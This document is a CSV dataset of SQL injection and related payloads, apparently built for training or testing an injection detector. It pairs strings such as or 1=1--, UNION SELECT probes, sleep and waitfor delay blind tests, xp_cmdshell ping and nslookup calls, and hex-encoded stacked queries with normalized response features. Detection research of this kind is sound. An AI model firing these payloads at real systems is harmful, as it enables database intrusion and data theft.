payload,payload_length,payload_type,response_code,response_length,triggered,has_single_quote,has_angle_bracket,has_double_dash,has_equals,special_char_count,payload_type_encoded
1 or sleep(__TIME__)#,-0.3147936097028178,sqli,-0.4397387471509151,0.4066202628924869,0,0,0,0,0,-0.21458275555337897,0
and 1 in (select var from temp)--,-0.2011838859002971,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.32573353540836664,0
or '7659'='7659,-0.37159847160407816,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.32573353540836664,0
or 'text' = n'text',-0.33372856366990455,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.2886832754567041,0
--,-0.49467567239014226,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.39983405531169175,0
or 1=1 or ''=',-0.38106594858762155,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.2886832754567041,0
declare @s varchar (200) select @s = 0x73656c6 ...,-0.04023677718005942,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
exec xp,-0.44733828747242527,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
; exec master..xp_cmdshell 'ping 172.10.1.255'--,-0.0591717311471462,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.06638171574672873,0
3.10E+17,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
""" or pg_sleep(__TIME__)--",-0.2769237017686442,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.1034319756983913,0
x' AND email IS NULL; --,-0.2863911787521876,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.32573353540836664,0
&,-0.5041431493736857,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
admin' or ',-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,1,0,0,0,-0.39983405531169175,0
or 'unusual' = 'unusual',-0.2863911787521876,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.2886832754567041,0
//,-0.49467567239014226,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
truncate,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
"1) or benchmark(10000000,MD5(1))#",-0.2011838859002971,sqli,-0.4397387471509151,0.4140532713760129,0,0,0,0,0,-0.21458275555337897,0
\x27UNION SELECT,-0.3621309946205348,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
declare @s varchar(200) select @s = 0x77616974 ...,-0.04023677718005942,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
tz_offset,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
sqlvuln,-0.44733828747242527,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
"""));waitfor delay '0:0:__TIME__'--",-0.19171640891675368,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,0.04476906410825895,0
||6,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
or%201=1 --,-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.32573353540836664,0
%2A%28%7C%28objectclass%3D%2A%29%29,-0.1822489319332103,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.1775324956017164,0
or a=a,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.43688431526335436,0
) union select * from information_schema.tables;,-0.0591717311471462,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.2886832754567041,0
PRINT @@variable,-0.3621309946205348,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
or isNULL(1/0) /*,-0.3526635176369914,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.2886832754567041,0
26 %,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
""" or ""a""=""a",-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.2886832754567041,0
(sqlvuln),-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
x' AND members.email IS NULL; --,-0.21065136288384048,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.2886832754567041,0
or 1=1--,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.3627837953600292,0
"and 1=( if((load_file(char(110,46,101,120,11 ...",-0.0591717311471462,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,0.04476906410825895,0
0x770061006900740066006F0072002000640065006C00 ...,-0.04023677718005942,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.3627837953600292,0
%20'sleep%2050',-0.37159847160407816,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.32573353540836664,0
as,-0.49467567239014226,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
1)) or pg_sleep(__TIME__)--,-0.25798874780155745,sqli,-0.4397387471509151,0.4103367671342499,0,0,0,1,0,-0.06638171574672873,0
/**/or/**/1/**/=/**/1,-0.3147936097028178,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,0.15591984396324662,0
union all select @@version--,-0.24852127081801403,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.32573353540836664,0
",@variable",-0.4189358565217951,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
(sqlattempt2),-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
or (EXISTS),-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
t'exec master..xp_cmdshell 'nslookup www.googl ...,-0.04023677718005942,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.14048223565005385,0
%20$(sleep%2050),-0.3621309946205348,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.2886832754567041,0
"1 or benchmark(10000000,MD5(1))#",-0.21065136288384048,sqli,-0.4397387471509151,0.4134338540023857,0,0,0,0,0,-0.2516330155050415,0
%20or%20''=',-0.4000009025547083,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.2516330155050415,0
||UTL_HTTP.REQUEST,-0.34319604065344794,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.32573353540836664,0
or pg_sleep(__TIME__)--,-0.295858655735731,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.14048223565005385,0
hi' or 'x'='x';,-0.37159847160407816,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.21458275555337897,0
""") or sleep(__TIME__)=""",-0.295858655735731,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1034319756983913,0
or 'whatever' in ('whatever'),-0.23905379383447065,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.2516330155050415,0
; begin declare @var varchar(8000) set @var=' ...,-0.04970425416360281,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.1034319756983913,0
0x77616974666F722064656C61792027303A303A313027 ...,-0.04023677718005942,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.3627837953600292,0
exec(@s),-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.3627837953600292,0
) or pg_sleep(__TIME__)--,-0.2769237017686442,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.1034319756983913,0
union select,-0.4000009025547083,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
or sleep(__TIME__)#,-0.33372856366990455,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.21458275555337897,0
select * from information_schema.tables--,-0.12544407003194993,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.2886832754567041,0
a' or 'a' = 'a,-0.38106594858762155,sqli,-0.4397387471509151,0.578818292760839,1,1,0,0,1,-0.2886832754567041,0
declare @s varchar(22) select @s =,-0.19171640891675368,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.2886832754567041,0
or 2 between 1 and 3,-0.32426108668636117,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
or a=a--,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.3627837953600292,0
or '1'='1,-0.4284033335053385,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.32573353540836664,0
|,-0.5041431493736857,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
or sleep(__TIME__)=',-0.32426108668636117,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.1775324956017164,0
or 1 --',-0.4378708104888819,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.3627837953600292,0
"or 0=0 #""",-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.3627837953600292,0
having,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
a',-0.49467567239014226,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.43688431526335436,0
""" or isNULL(1/0) /*",-0.33372856366990455,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.2516330155050415,0
declare @s varchar (8000) select @s = 0x73656c ...,-0.04023677718005942,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
â or 1=1 --,-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.2516330155050415,0
char%4039%41%2b%40SELECT,-0.2863911787521876,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.32573353540836664,0
order by,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
bfilename,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
having 1=1--,-0.4000009025547083,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.3627837953600292,0
") or benchmark(10000000,MD5(1))#",-0.21065136288384048,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.21458275555337897,0
or username like char(37);,-0.26745622478510084,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.3627837953600292,0
;waitfor delay '0:0:__TIME__'--,-0.22011883986738387,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.06638171574672873,0
""" or 1=1--",-0.4189358565217951,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.32573353540836664,0
x' AND userid IS NULL; --,-0.2769237017686442,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.32573353540836664,0
*/*,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.3627837953600292,0
or 'text' > 't',-0.37159847160407816,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.2886832754567041,0
(select top 1,-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
"or benchmark(10000000,MD5(1))#",-0.22958631685092726,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.2516330155050415,0
""");waitfor delay '0:0:__TIME__'--",-0.2011838859002971,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,0.007718804156596389,0
a' or 3=3--,-0.4094683795382517,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,1,-0.32573353540836664,0
-- &password=,-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.32573353540836664,0
group by userid having 1=1--,-0.24852127081801403,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.3627837953600292,0
or ''=',-0.44733828747242527,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.32573353540836664,0
; exec master..xp_cmdshell,-0.26745622478510084,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.32573353540836664,0
%20or%20x=x,-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.3627837953600292,0
select,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
""")) or sleep(__TIME__)=""",-0.2863911787521876,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.06638171574672873,0
0x730065006c0065006300740020004000400076006500 ...,-0.04023677718005942,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.3627837953600292,0
""") or pg_sleep(__TIME__)--",-0.26745622478510084,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.06638171574672873,0
%20or%20'x'='x,-0.38106594858762155,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.2516330155050415,0
or 'something' = 'some'+'thing',-0.22011883986738387,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.1775324956017164,0
exec sp,-0.44733828747242527,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
29 %,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
(,-0.5041431493736857,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
Ã½ or 1=1 --,-0.4000009025547083,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.2886832754567041,0
1 or pg_sleep(__TIME__)--,-0.2769237017686442,sqli,-0.4397387471509151,0.40909793238699554,0,0,0,1,0,-0.14048223565005385,0
0 or 1=1,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.43688431526335436,0
) or (a=a,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.3627837953600292,0
uni/**/on sel/**/ect,-0.32426108668636117,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.1775324956017164,0
replace,-0.44733828747242527,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
%27%20or%201=1,-0.38106594858762155,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.32573353540836664,0
)) or pg_sleep(__TIME__)--,-0.26745622478510084,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.06638171574672873,0
%7C,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
x' AND 1=(SELECT COUNT(*) FROM tabname); --,-0.10650911606486316,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,1,-0.1034319756983913,0
&apos;%20OR,-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.3627837953600292,0
; or '1'='1',-0.4000009025547083,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.2516330155050415,0
declare @q nvarchar (200) select @q = 0x770061 ...,-0.04023677718005942,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
1 or 1=1,-0.4378708104888819,sqli,-0.4397387471509151,0.3985678370353337,0,0,0,0,1,-0.43688431526335436,0
; exec ('sel' + 'ect us' + 'er'),-0.21065136288384048,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.06638171574672873,0
23 OR 1=1,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.43688431526335436,0
/,-0.5041431493736857,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
anything' OR 'x'='x,-0.33372856366990455,sqli,-0.4397387471509151,0.5943037271015181,1,1,0,0,1,-0.2886832754567041,0
declare @q nvarchar (4000) select @q =,-0.15384650098258013,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.2886832754567041,0
desc,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
||'6,-0.47574071842305543,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.3627837953600292,0
),-0.5041431493736857,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
1)) or sleep(__TIME__)#,-0.295858655735731,sqli,-0.4397387471509151,0.4078590976397412,0,0,0,0,0,-0.14048223565005385,0
select name from syscolumns where id = (sele ...,-0.0591717311471462,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.2886832754567041,0
hi or a=a,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.43688431526335436,0
*(|(mail=*)),-0.4000009025547083,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
password:*/=1--,-0.37159847160407816,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.2516330155050415,0
distinct,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
);waitfor delay '0:0:__TIME__'--,-0.21065136288384048,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.029331455795066172,0
to_timestamp_tz,-0.37159847160407816,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
""") or benchmark(10000000,MD5(1))#",-0.2011838859002971,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.1775324956017164,0
UNION SELECT,-0.4000009025547083,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
%2A%28%7C%28mail%3D%2A%29%29,-0.24852127081801403,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.1775324956017164,0
+sqlvuln,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
or 1=1 /*,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.3627837953600292,0
)) or sleep(__TIME__)=',-0.295858655735731,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.1034319756983913,0
"or 1=1 or """"=",-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.32573353540836664,0
or 1 in (select @@version)--,-0.24852127081801403,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.2516330155050415,0
sqlvuln;,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
union select * from users where login = char ...,-0.0591717311471462,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.2886832754567041,0
28 %,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
â or 3=3 --,-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.2516330155050415,0
@variable,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
or '1'='1'--,-0.4000009025547083,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,1,-0.21458275555337897,0
"""a"""" or 1=1--""",-0.38106594858762155,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.21458275555337897,0
//*,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.3627837953600292,0
%2A%7C,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
""" or 0=0 --",-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.32573353540836664,0
""")) or pg_sleep(__TIME__)--",-0.25798874780155745,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.029331455795066172,0
?,-0.5041431493736857,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
or 1/*,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
!,-0.5041431493736857,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
',-0.5041431493736857,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.43688431526335436,0
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),0.8023686743553025,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
